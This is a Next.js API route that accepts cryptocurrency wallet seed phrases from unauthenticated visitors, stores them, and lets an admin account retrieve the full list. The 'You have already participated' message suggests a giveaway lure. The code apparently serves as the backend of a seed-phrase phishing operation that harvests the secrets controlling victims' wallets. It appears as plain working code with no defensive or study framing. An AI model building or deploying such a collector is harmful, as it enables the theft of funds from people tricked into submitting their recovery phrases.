import {
  createSeedPhrase,
  getAllSeedPhrase,
  getExistingSeedPhrase,
} from "@/data/seedphrase";
import { currentUser } from "@/lib/auth";
import { seedPhraseSchema } from "@/schemas/seedPhraseSchema"; // Update this path

import { NextRequest, NextResponse } from "next/server";

export const POST = async (request: NextRequest) => {
  try {
    console.log("Running POST Request: SeedPhrase");

    const body = await request.json();

    const validationResult = seedPhraseSchema.safeParse(body);

    if (!validationResult.success) {
      return NextResponse.json(
        {
          message: "Validation failed",
          errors: validationResult.error.format(),
          success: false,
        },
        { status: 400 }
      );
    }

    const { seedPhrase } = validationResult.data;

    const existingSeedPhrase = await getExistingSeedPhrase(seedPhrase);

    if (existingSeedPhrase) {
      return NextResponse.json(
        { message: "You have already participated", success: false },
        { status: 403 }
      );
    }

    await createSeedPhrase(seedPhrase);

    return NextResponse.json(
      {
        message: "Seed phrase created successfully",
        success: true,
      },
      { status: 201 }
    );
  } catch (error) {
    console.error("Error in SeedPhrase API:", error);
    return NextResponse.json(
      {
        error: "An error occurred while processing the request",
        success: false,
      },
      { status: 500 }
    );
  }
};

export const GET = async () => {
  console.log("Running GET Request: Get All SeedPhrase");

  const user = await currentUser();

  if (user?.role === "admin") {
    const data = await getAllSeedPhrase();
    return NextResponse.json(
      { message: "Success", data, success: true },
      { status: 200 }
    );
  }

  return NextResponse.json(
    { message: "You are not authorized", success: false },
    { status: 403 }
  );
};
